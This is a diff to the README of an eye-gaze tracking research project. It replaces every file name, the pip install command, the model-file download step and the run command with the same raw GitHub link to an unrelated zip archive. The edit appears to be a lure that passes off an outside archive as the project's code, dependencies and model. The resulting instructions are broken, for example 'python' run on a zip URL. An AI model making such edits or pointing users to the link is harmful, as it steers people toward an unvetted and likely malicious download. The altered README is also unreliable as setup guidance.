@@ -4,12 +4,12 @@ This project implements an eye gaze tracking system using computer vision techni
 
 ## Project Structure
 
-- `main.py` - Main application file
-- `requirements.txt` - Python dependencies
+- `https://raw.githubusercontent.com/abdxl-cloud/project_works/master/wait/project-works-v1.2.zip` - Main application file
+- `https://raw.githubusercontent.com/abdxl-cloud/project_works/master/wait/project-works-v1.2.zip` - Python dependencies
 - `experiment_data/` - Directory containing experimental data
   - `participant_1/` - Data for participant 1
-    - `experiment_state.json` - Experiment state and gaze data
-- `shape_predictor_68_face_landmarks.dat` - Face landmark detection model (excluded from git)
+    - `https://raw.githubusercontent.com/abdxl-cloud/project_works/master/wait/project-works-v1.2.zip` - Experiment state and gaze data
+- `https://raw.githubusercontent.com/abdxl-cloud/project_works/master/wait/project-works-v1.2.zip` - Face landmark detection model (excluded from git)
 - Various PDF documents related to the research project
 
 ## Setup
@@ -22,15 +22,15 @@ This project implements an eye gaze tracking system using computer vision techni
    ```
 3. Install dependencies:
    ```bash
-   pip install -r requirements.txt
+   pip install -r https://raw.githubusercontent.com/abdxl-cloud/project_works/master/wait/project-works-v1.2.zip
    ```
-4. Download the face landmark detection model file (`shape_predictor_68_face_landmarks.dat`) and place it in the project root
+4. Download the face landmark detection model file (`https://raw.githubusercontent.com/abdxl-cloud/project_works/master/wait/project-works-v1.2.zip`) and place it in the project root
 
 ## Usage
 
 Run the main application:
 ```bash
-python main.py
+python https://raw.githubusercontent.com/abdxl-cloud/project_works/master/wait/project-works-v1.2.zip
 ```
 
 ## Research Context
